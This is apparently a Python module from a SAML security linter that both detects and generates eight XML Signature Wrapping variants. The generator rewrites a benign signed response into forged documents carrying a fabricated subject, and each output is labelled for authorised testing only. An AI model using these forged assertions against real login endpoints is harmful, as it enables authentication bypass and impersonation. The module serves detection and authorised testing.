"""Signature-wrapping shapes: one predicate and one builder per variant.

The detector and the generator live in the same module on purpose. A variant is
defined once, as a structural predicate over (signature position, referenced
element, position of the unsigned content), and the builder produces exactly
that shape. If the two ever drift apart the round-trip test in
``tests/test_generate.py`` fails.

On the numbering: variants 1-8 follow the taxonomy that grew out of the public
SAML signature-wrapping literature - Somorovsky et al., "On Breaking SAML: Be
Whoever You Want to Be" (USENIX Security 2012) - and the numbering popularised
by the Burp extension SAML Raider. Published descriptions differ in small
details, so the table below states the exact predicate this tool matches rather
than relying on the number alone. Documents commonly match more than one shape;
every match is reported.
"""

from __future__ import annotations

import copy
from dataclasses import dataclass
from xml.etree import ElementTree as ET

from .findings import Finding
from .model import NS_ASSERTION, NS_DSIG, NS_PROTOCOL, SAML_ID_ATTR, Document, localname

ASSERTION_TAG = f"{{{NS_ASSERTION}}}Assertion"
RESPONSE_TAG = f"{{{NS_PROTOCOL}}}Response"
SIGNATURE_TAG = f"{{{NS_DSIG}}}Signature"
OBJECT_TAG = f"{{{NS_DSIG}}}Object"
EXTENSIONS_TAG = f"{{{NS_PROTOCOL}}}Extensions"
NAMEID_TAG = f"{{{NS_ASSERTION}}}NameID"

FORGED_NAMEID = "fabricated-forged-subject-0001"
FORGED_SUFFIX = "-forged"

BANNER = """
  saml-xsw-lint: generated XML Signature Wrapping variant {number} ({slug})

  FOR AUTHORISED TESTING ONLY. This document is deliberately malformed.
  Send it only to an identity provider or service provider that you own or
  have written permission to test. Using it against a third party's login
  endpoint is an attack on that third party.

  Shape: {shape}
  Expected finding: {finding}
  Generated offline from: {source}
"""


@dataclass(frozen=True)
class Variant:
    number: int
    slug: str
    finding_id: str
    #: "response" or "assertion" - which element the input must sign.
    signs: str
    shape: str

    @property
    def filename(self) -> str:
        return f"xsw-{self.number:02d}-{self.slug}.xml"


VARIANTS: tuple[Variant, ...] = (
    Variant(1, "signed-response-in-signature", "XSW001", "response",
            "the referenced element is a Response and it is a descendant of the Signature that "
            "references it; the forged Response is the document root"),
    Variant(2, "signed-response-beside-signature", "XSW002", "response",
            "the referenced element is a Response which is neither an ancestor nor a descendant "
            "of the Signature that references it; both sit inside the forged Response"),
    Variant(3, "forged-assertion-first", "XSW003", "assertion",
            "the referenced Assertion has an unsigned Assertion sibling earlier in document "
            "order under the same parent"),
    Variant(4, "signed-assertion-nested", "XSW004", "assertion",
            "the referenced Assertion is a descendant of an unsigned Assertion"),
    Variant(5, "detached-signature", "XSW005", "assertion",
            "the Signature is outside the Assertion it references and is not an ancestor of it, "
            "and the document contains an unsigned Assertion"),
    Variant(6, "signed-assertion-in-signature", "XSW006", "assertion",
            "the referenced Assertion is a descendant of the Signature that references it, "
            "and not inside a ds:Object"),
    Variant(7, "assertion-in-extensions", "XSW007", "assertion",
            "an Assertion is a descendant of samlp:Extensions"),
    Variant(8, "signed-assertion-in-object", "XSW008", "assertion",
            "the referenced Assertion is a descendant of a ds:Object inside the Signature that "
            "references it"),
)

BY_NUMBER = {variant.number: variant for variant in VARIANTS}


# ------------------------------------------------------------------- detection
def _targets(doc: Document) -> list[tuple[ET.Element, ET.Element]]:
    """(signature element, referenced element) pairs for resolved references."""
    pairs = []
    for signature in doc.signatures:
        for ref in signature.references:
            if ref.target is not None and not ref.whole_document:
                pairs.append((signature.element, ref.target))
    return pairs


def detect(doc: Document, options=None) -> list[Finding]:
    """Report every XSW shape the document matches."""
    out: list[Finding] = []
    uncovered = doc.unsigned_assertions()

    for signature, target in _targets(doc):
        sig_inside_target = doc.is_ancestor(target, signature)
        target_inside_sig = doc.is_ancestor(signature, target)
        in_object = doc.enclosed_by_localname(target, "Object") is not None

        if target.tag == RESPONSE_TAG:
            if target_inside_sig:
                out.append(Finding("XSW001", doc.path(target),
                                   f"signed Response (ID={target.attrib.get(SAML_ID_ATTR, '-')}) "
                                   f"is nested inside {doc.path(signature)}"))
            elif not sig_inside_target:
                out.append(Finding("XSW002", doc.path(target),
                                   f"signed Response (ID={target.attrib.get(SAML_ID_ATTR, '-')}) "
                                   f"is neither ancestor nor descendant of {doc.path(signature)}"))

        if target.tag == ASSERTION_TAG:
            parent = doc.parent(target)
            if parent is not None:
                earlier = [
                    sibling for sibling in parent
                    if sibling.tag == ASSERTION_TAG
                    and doc.document_order(sibling) < doc.document_order(target)
                    and not doc.is_covered(sibling)
                ]
                if earlier:
                    out.append(Finding("XSW003", doc.path(earlier[0]),
                                       f"unsigned Assertion precedes the signed Assertion at "
                                       f"{doc.path(target)}"))
            # An unsigned Assertion ancestor only means XSW4 if the signed assertion
            # sits inside it directly. With a Signature in between the shape is XSW6 or
            # XSW8 instead, and reporting XSW4 as well would just be double counting.
            wrapper = None
            for ancestor in doc.ancestors(target):
                if ancestor.tag == SIGNATURE_TAG:
                    break
                if ancestor.tag == ASSERTION_TAG and not doc.is_covered(ancestor):
                    wrapper = ancestor
                    break
            if wrapper is not None:
                out.append(Finding("XSW004", doc.path(wrapper),
                                   f"unsigned Assertion wraps the signed Assertion at "
                                   f"{doc.path(target)}"))
            if target_inside_sig:
                finding_id = "XSW008" if in_object else "XSW006"
                out.append(Finding(finding_id, doc.path(target),
                                   f"signed Assertion (ID={target.attrib.get(SAML_ID_ATTR, '-')}) "
                                   f"is nested inside {doc.path(signature)}"))
            elif not sig_inside_target and uncovered:
                out.append(Finding("XSW005", doc.path(signature),
                                   f"Signature sits outside the Assertion it references "
                                   f"({doc.path(target)}); "
                                   f"{len(uncovered)} unsigned assertion(s) present"))

    for assertion in doc.assertions:
        container = doc.enclosed_by_localname(assertion, "Extensions")
        if container is not None:
            out.append(Finding("XSW007", doc.path(assertion),
                               f"Assertion (ID={assertion.attrib.get(SAML_ID_ATTR, '-')}, "
                               f"{'signed' if doc.is_covered(assertion) else 'unsigned'}) is inside "
                               f"{doc.path(container)}"))
    return out


# ------------------------------------------------------------------ generation
class GenerationError(Exception):
    """The input document cannot be used to build the requested variant."""


@dataclass
class Generated:
    variant: Variant
    xml: str

    @property
    def filename(self) -> str:
        return self.variant.filename


def _single_signature(doc: Document):
    if len(doc.signatures) != 1:
        raise GenerationError(
            f"input must contain exactly one ds:Signature, found {len(doc.signatures)}"
        )
    signature = doc.signatures[0]
    refs = [r for r in signature.references if r.target is not None and not r.whole_document]
    if len(refs) != 1:
        raise GenerationError(
            "input must contain exactly one resolved same-document Reference, found "
            f"{len(refs)}"
        )
    return signature, refs[0]


def signed_kind(doc: Document) -> str:
    """"response" or "assertion", by what the single signature references."""
    _, ref = _single_signature(doc)
    if ref.target.tag == RESPONSE_TAG:
        return "response"
    if ref.target.tag == ASSERTION_TAG:
        return "assertion"
    raise GenerationError(f"signature references {localname(ref.target.tag)}, which is not supported")


def applicable(doc: Document) -> list[Variant]:
    kind = signed_kind(doc)
    return [variant for variant in VARIANTS if variant.signs == kind]


def _forge(element: ET.Element, *, drop_signature: bool = True) -> ET.Element:
    """Copy an element, strip its signature and relabel it as attacker content."""
    forged = copy.deepcopy(element)
    if drop_signature:
        for parent in forged.iter():
            for child in list(parent):
                if child.tag == SIGNATURE_TAG:
                    parent.remove(child)
    for node in forged.iter():
        current = node.attrib.get(SAML_ID_ATTR)
        if current:
            node.attrib[SAML_ID_ATTR] = current + FORGED_SUFFIX
        if node.tag == NAMEID_TAG:
            node.text = FORGED_NAMEID
    return forged


def _detach(parent: ET.Element, child: ET.Element) -> ET.Element:
    parent.remove(child)
    return child


def _build(doc: Document, variant: Variant) -> ET.Element:
    signature_info, ref = _single_signature(doc)
    signature = signature_info.element
    target = ref.target
    root = copy.deepcopy(doc.root)
    # Re-resolve the working copy against the same positions.
    working = Document(root=root, raw=doc.raw)
    signature_info, ref = _single_signature(working)
    signature, target = signature_info.element, ref.target
    sig_parent = working.parent(signature)
    target_parent = working.parent(target)

    if variant.number in (1, 2):
        forged_root = _forge(target)
        _detach(sig_parent, signature)
        if variant.number == 1:
            signature.append(target)
            forged_root.append(signature)
        else:
            forged_root.append(target)
            forged_root.append(signature)
        return forged_root

    forged = _forge(target)
    if variant.number == 3:
        target_parent.insert(list(target_parent).index(target), forged)
        return root
    if variant.number == 4:
        index = list(target_parent).index(target)
        target_parent.remove(target)
        forged.append(target)
        target_parent.insert(index, forged)
        return root
    if variant.number == 5:
        _detach(sig_parent, signature)
        index = list(target_parent).index(target)
        target_parent.insert(index + 1, forged)
        target_parent.insert(index + 2, signature)
        return root
    if variant.number in (6, 8):
        _detach(sig_parent, signature)
        index = list(target_parent).index(target)
        target_parent.remove(target)
        if variant.number == 8:
            container = ET.SubElement(signature, OBJECT_TAG)
            container.append(target)
        else:
            signature.append(target)
        forged.append(signature)
        target_parent.insert(index, forged)
        return root
    if variant.number == 7:
        index = list(target_parent).index(target)
        target_parent.remove(target)
        extensions = ET.Element(EXTENSIONS_TAG)
        extensions.append(target)
        target_parent.insert(index, extensions)
        target_parent.insert(index + 1, forged)
        return root
    raise GenerationError(f"no builder for variant {variant.number}")


def generate(doc: Document, variants: list[Variant], *, source: str = "(stdin)") -> list[Generated]:
    """Build the requested variants from a benign signed document."""
    from .emit import serialise  # local import keeps emit out of the lint path

    kind = signed_kind(doc)
    out: list[Generated] = []
    for variant in variants:
        if variant.signs != kind:
            raise GenerationError(
                f"variant {variant.number} needs a document whose signature covers the "
                f"{variant.signs}, but this document signs the {kind}"
            )
        banner = BANNER.format(
            number=variant.number,
            slug=variant.slug,
            shape=variant.shape,
            finding=variant.finding_id,
            source=source,
        )
        out.append(Generated(variant=variant, xml=serialise(_build(doc, variant), banner=banner)))
    return out
